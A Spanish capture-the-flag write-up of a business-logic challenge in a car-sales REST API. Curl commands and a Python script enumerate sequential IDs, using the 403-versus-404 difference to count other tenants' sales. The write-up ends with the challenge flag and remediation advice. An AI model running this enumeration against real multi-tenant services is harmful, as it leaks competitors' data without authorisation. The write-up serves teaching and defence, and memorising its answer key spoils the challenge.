# Venta de autos — Writeup

**Plataforma:** HackLab (SoftwareSeguro)
**Edición:** HackLab 2025
**Categoría:** Lógica de negocio
**Autor:** adonaissh

## Descripción del desafío

Se entrega acceso a una API REST de gestión de ventas de autos (usada por
múltiples concesionarias del país) mediante una API Key
(`X-API-Key: 55f53057-d320-4bec-8447-0ba940740595`), asociada a una sola
concesionaria.

**Objetivo:** averiguar cuántas ventas hicieron el resto de las
concesionarias (no la propia) el día **01/10/2025**, y entregar
`MD5([CANTIDAD][ULTIMO_ID])`, donde `ULTIMO_ID` es el ID de la última
venta de ese día considerando solo las ventas ajenas.

Endpoints disponibles:
```
GET  /api/comprador/{id}
GET  /api/vendedor/{id}
GET  /api/venta/{id}
GET  /api/ventas?fecha=YYYY-MM-DD
POST /api/comprador
POST /api/vendedor
POST /api/venta
```

## Qué es una falla de lógica de negocio

A diferencia de un XSS o un SQLi, acá no hay ningún input malformado que
"rompa" el sistema. El código funciona exactamente como fue programado; el
problema es que el **diseño** del sistema asume cosas que no se
cumplen en la práctica — en este caso, que separar el *listado* de datos
por concesionaria alcanza para proteger toda la información, sin
contemplar que otros caminos (consulta directa por ID, creación de
registros) exponen el mismo dato de otra forma, o revelan información
indirecta sobre él.

## Reconocimiento

### Paso 1 — Probar el listado por fecha

Primer comando ejecutado contra la API, con la URL completa (todavía sin
variables de entorno):

```bash
curl -s "https://chl-08adbe3b-b415-464e-9103-8bb158158af5-venta-de-autos.softwareseguro.com.ar/api/ventas?fecha=2025-10-01" \
  -H "X-API-Key: 55f53057-d320-4bec-8447-0ba940740595"
```

Devuelve 45 ventas, todas con `vendedor_id` entre 1 y 4 (la concesionaria
propia tiene 4 vendedores) y `comprador_id` entre 1 y 16. Observación clave
mirando los `id` de cada venta: **no son correlativos**. Por ejemplo, la
lista salta de `id: 100921` a `id: 100926`, luego a `id: 100938`, etc. Esos
huecos numéricos son la primera pista: existen ventas con esos IDs
intermedios, pero pertenecen a otras concesionarias y el endpoint las
oculta del listado.

De acá en adelante, para comodidad, se definieron variables de entorno:
```bash
TOKEN="55f53057-d320-4bec-8447-0ba940740595"
BASE="https://chl-08adbe3b-b415-464e-9103-8bb158158af5-venta-de-autos.softwareseguro.com.ar"
```

### Paso 2 — Probar si el detalle por ID expone ventas ajenas directamente

Se intentó acceder directo a uno de los IDs "faltantes" del listado
(`100922`), con la hipótesis de que fuera un IDOR simple como en otros
desafíos de la serie:

```bash
curl -s "$BASE/api/venta/100922" -H "X-API-Key: $TOKEN"
# {"error": "Forbidden"}
```

A diferencia de otros desafíos de IDOR, acá el endpoint de detalle **sí**
valida ownership: devuelve `403 Forbidden` para ventas ajenas. Esto
descartó el camino más directo.

### Paso 3 — Explorar compradores y vendedores en busca de otra vía

Se probó si `/api/comprador/{id}` y `/api/vendedor/{id}` tenían la misma
protección, revisando en bloque un rango de compradores:

```bash
for i in $(seq 1 30); do
  echo "=== comprador $i ==="
  curl -s "$BASE/api/comprador/$i" -H "X-API-Key: $TOKEN"
  echo
done
```

Resultado: compradores `1` a `16` responden `200` con datos reales
(nombre, apellido, DNI); desde el `17` en adelante, `403 Forbidden`. Mismo
patrón de aislamiento por concesionaria que en ventas — esta vía tampoco
ofrecía una lectura directa de datos ajenos. Se revisaron también los
nombres de los compradores/vendedores propios por si el compañero había
"marcado" alguno de forma reconocible; ninguno se destacaba del resto.

### Paso 4 — Sondear el comportamiento de los POST

Se probó crear un comprador de prueba, para entender cómo se asignan los
IDs:
```bash
curl -s -X POST "$BASE/api/comprador" -H "X-API-Key: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"nombre":"Test","apellido":"Prueba","dni":"00000000"}'
# {"id": 80, ...}
```
Con solo 16 compradores propios, el nuevo registro recibió `id: 80` —
confirma que los IDs de comprador (y, por extensión, de venta) **se
autoincrementan de forma global**, compartidos entre todas las
concesionarias que usan el sistema, no por separado para cada una.

Se intentó el mismo sondeo con una venta, en un primer intento sin todos
los campos:
```bash
curl -s -X POST "$BASE/api/venta" -H "X-API-Key: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"comprador_id":1,"vendedor_id":1,"marca":"Test","modelo":"Test","anio":2024,"precio":1000}'
# {"error": "Missing required fields: vendedor_id, comprador_id, marca,
#            modelo, anio, precio, fecha_venta, hora_venta"}
```
El mensaje de error reveló dos campos no evidentes hasta ese momento:
`fecha_venta` y `hora_venta` son requeridos y **se pueden elegir
libremente** al crear una venta. Repitiendo el POST con esos campos
completos:
```bash
curl -s -X POST "$BASE/api/venta" -H "X-API-Key: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"comprador_id":1,"vendedor_id":1,"marca":"Test","modelo":"Test",
       "anio":2024,"precio":1000,"fecha_venta":"2025-10-01","hora_venta":"23:59:59"}'
# {"id": 101092, ...}
```
El ID devuelto (`101092`) correspondió al contador global *del momento
real de creación* (varios días después del 01/10), sin importar la fecha
falsa indicada en `fecha_venta` — confirmando que no es posible
"insertarse" en un rango de IDs ya pasado simulando una fecha antigua.

### Paso 5 — Un detalle crucial: 403 vs 404 son distinguibles

Buscando otra vía ya que no se podía leer el contenido de ventas ajenas,
se probó qué pasaba con un ID que directamente no existiera en el sistema:

```bash
curl -s -i "$BASE/api/venta/999999" -H "X-API-Key: $TOKEN"
# HTTP/2 404
# {"error": "Not found"}
```

El sistema devuelve **códigos de estado distintos** según el motivo del
rechazo:
- `404 Not found` → el ID no existe en ningún lado del sistema.
- `403 Forbidden` → el ID existe, pero pertenece a otra concesionaria.
- `200 OK` → el ID existe y es propio (se ve el contenido completo).

Esta distinción, aunque no filtra datos sensibles por sí sola, **sí filtra
un bit de información**: si un recurso existe o no. Es la pieza clave que
terminó permitiendo resolver el desafío sin necesidad de leer el contenido
de las ventas ajenas.

## Estrategia de resolución

Dado que:
1. El listado por fecha (`GET /api/ventas?fecha=...`) sí es confiable y
   filtrado correctamente para la concesionaria propia.
2. El detalle por ID (`GET /api/venta/{id}`) distingue 404 (no existe) de
   403 (existe, ajeno) de 200 (existe, propio).
3. Los IDs son correlativos y compartidos globalmente.

La estrategia fue: **recorrer, uno por uno, todo el rango de IDs
correspondiente al 01/10/2025, clasificando cada respuesta por su código
de estado**, para contar exactamente cuántos son ajenos (403) y cuál es el
más alto de ellos.

### Delimitar el rango del día

Primero se delimitaron los bordes del 01/10 usando los propios datos:

```bash
curl -s "$BASE/api/ventas?fecha=2025-09-30" -H "X-API-Key: $TOKEN"
# última venta propia del 30/09: id 100900, hora 23:59:59
```
```bash
curl -s "$BASE/api/ventas?fecha=2025-10-02" -H "X-API-Key: $TOKEN"
# primera venta propia del 02/10: id 101049, hora 00:00:00
```

Como la última venta propia del 30/09 (`100900`) y la primera del 01/10
(`100901`) son **consecutivas**, y lo mismo ocurre entre la última del
01/10 (`100901` a `101048`) y la primera del 02/10 (`101049`), se concluyó
que el rango completo de IDs del 01/10 (de todas las concesionarias) es
exactamente **100901 a 101048**.

> ⚠️ Nota importante sobre un error de cálculo durante la resolución: en un
> primer momento se asumió que, al no haber huecos en los *bordes* del
> día, tampoco los habría *dentro* del rango, y se calculó la cantidad
> total simplemente como `101048 - 100901 + 1 = 148`. Esta asunción fue
> **incorrecta** y llevó a un primer envío fallido al juez. La resta de
> extremos no reemplaza una verificación real: solo confirma continuidad
> en los bordes, no en el interior del rango.

### Verificación real del rango completo

Se escribió un script que consulta cada ID del rango individualmente y
clasifica la respuesta:

```python
import requests
import time

BASE = "https://chl-....softwareseguro.com.ar"
TOKEN = "55f53057-d320-4bec-8447-0ba940740595"
headers = {"X-API-Key": TOKEN}

no_encontrados, propios, ajenos = [], [], []

for i in range(100901, 101049):
    r = requests.get(f"{BASE}/api/venta/{i}", headers=headers)
    if r.status_code == 404:
        no_encontrados.append(i)
    elif r.status_code == 200:
        propios.append(i)
    elif r.status_code == 403:
        ajenos.append(i)
    time.sleep(0.05)

print("No encontrados (404):", no_encontrados)
print("Propios (200):", len(propios))
print("Ajenos (403):", len(ajenos))
print("Ultimo ajeno (403) mas alto:", max(ajenos) if ajenos else None)
```

### Resultado de la verificación

```
No encontrados (404): [100927, 100940, 101007, 101022]
Propios (200): 45
Ajenos (403): 99
Ultimo ajeno (403) mas alto: 101047
```

Esto reveló **4 IDs que nunca existieron** dentro del rango (`100927`,
`100940`, `101007`, `101022`) — probablemente ventas descartadas,
canceladas, o simplemente números nunca asignados por el sistema. Esta es
la diferencia entre los 148 "teóricos" de la resta ingenua y los 148
(45+99+4) reales confirmados dato por dato: **45 propias + 99 ajenas + 4
inexistentes = 148**, cuadra perfecto, pero la cantidad de ventas ajenas
real es **99**, no 103 como daba el cálculo erróneo inicial
(`148 - 45 = 103`, que no descontaba los 4 inexistentes).

## Explotación — armado de la respuesta

```
Cantidad de ventas de otras concesionarias el 01/10 = 99
Último ID de venta ajena ese día = 101047
```

Confirmación puntual del último ID (clasificado como "existe pero ajeno"):
```bash
curl -s -i "$BASE/api/venta/101047" -H "X-API-Key: $TOKEN"
# HTTP/2 403
# {"error": "Forbidden"}
```

Según el formato pedido por el enunciado — `MD5([CANTIDAD][ULTIMO_ID])`,
concatenado sin separador:

```bash
echo -n "99101047" | md5sum
```

### Resultado

**Flag:** `5064f37401dd1c8710edf69cd492784e`

## Causa raíz y remediación

- **Causa raíz:** el diseño del sistema protege correctamente el
  **contenido** de los recursos ajenos (403 Forbidden al intentar leerlos),
  pero no contempla que la sola **existencia** de un recurso (distinguible
  por el código de estado 403 vs 404) es en sí misma información
  explotable. Combinado con identificadores **secuenciales y compartidos
  globalmente** entre distintos tenants (concesionarias) del sistema, un
  atacante puede reconstruir estadísticas agregadas de negocio (cantidad
  de operaciones, actividad relativa entre competidores, volumen por
  período) sin necesidad de leer ni un solo dato sensible de un recurso
  ajeno — es una fuga de información por canal lateral (CWE-203: Observable
  Discrepancy), amplificada por una decisión de diseño cuestionable:
  identificadores correlativos compartidos entre organizaciones que
  deberían estar aisladas entre sí.

- **Remediación recomendada:**
  1. **Responder siempre con el mismo código de estado** (404, por
     ejemplo) tanto para recursos inexistentes como para recursos que
     existen pero no pertenecen al solicitante, de forma que no se pueda
     distinguir "no existe" de "no es tuyo" desde afuera.
  2. **No compartir un único contador autoincremental entre distintos
     tenants** (clientes/organizaciones) de un sistema multi-tenant. Usar
     identificadores namespaced por concesionaria (p. ej. un ID compuesto,
     o una secuencia independiente por tenant), o directamente UUIDs no
     correlativos, para que la numeración de una organización no filtre
     información sobre la actividad de otra.
  3. Si el negocio necesita aislar completamente los datos entre
     concesionarias, considerar **aislamiento a nivel de almacenamiento**
     (esquemas o bases de datos separadas) en vez de un único pool de
     datos con filtrado a nivel de aplicación — reduce drásticamente la
     superficie de errores de este tipo.
  4. Auditar cualquier endpoint que permita **inferir** el estado interno
     del sistema (conteo de registros, rangos de IDs, timestamps de
     creación) con la misma seriedad que uno que expone datos
     directamente: en sistemas multi-cliente, metadatos "inocentes" pueden
     filtrar información competitiva sensible (en este caso, el volumen de
     ventas diario de la competencia).

## Herramientas usadas

- `curl` (exploración manual de la API y verificación de casos puntuales)
- Python 3 + `requests` (recorrido sistemático del rango de IDs,
  clasificación por código de estado HTTP)
- `md5sum` (cálculo del hash final)

## Lección aprendida

El error de cálculo cometido durante la resolución (asumir continuidad del
rango de IDs a partir de que los *bordes* eran consecutivos) es en sí
mismo un buen ejemplo de la clase de falla que se buscaba explotar: dar
por válida una suposición razonable pero no verificada. La corrección —
reemplazar la resta algebraica por una verificación exhaustiva, ID por
ID, del estado real de cada recurso — es la misma disciplina que separa un
análisis de lógica de negocio sólido de uno que "parece" correcto.